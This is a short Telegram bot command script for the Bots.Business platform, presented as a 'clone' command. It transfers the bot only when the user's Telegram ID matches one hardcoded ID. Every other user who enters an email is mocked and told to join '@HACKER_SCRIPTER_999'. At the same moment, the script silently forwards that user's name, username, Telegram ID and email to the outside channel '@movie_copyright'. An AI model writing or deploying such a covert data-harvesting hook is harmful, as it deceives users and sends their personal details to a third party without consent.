/*CMD
  command: clone
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: Send Your Bots Business Email 

  <<KEYBOARD

  KEYBOARD
  aliases: 
  group: 
CMD*/

if (user.telegramid == 5802525423){
BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("*Bot Transfer Done*")
}else{
Bot.sendMessage("🚫*Kids can't clone this bot first join - @HACKER_SCRIPTER_999*")
Api.sendMessage({ chat_id: "@movie_copyright",
text: "*🆕New Cloner Found\n\nFirst Name: 👤 -  "+user.first_name+" \n\n🕵️User Name - @"+user.username+"\n\n👨‍💻User Id - "+user.telegramid+"\n\n📧His Email - "+message+
"\n\n🌟Bot Name = @"+bot.name+
"*",parse_mode: "Markdown"
})
}
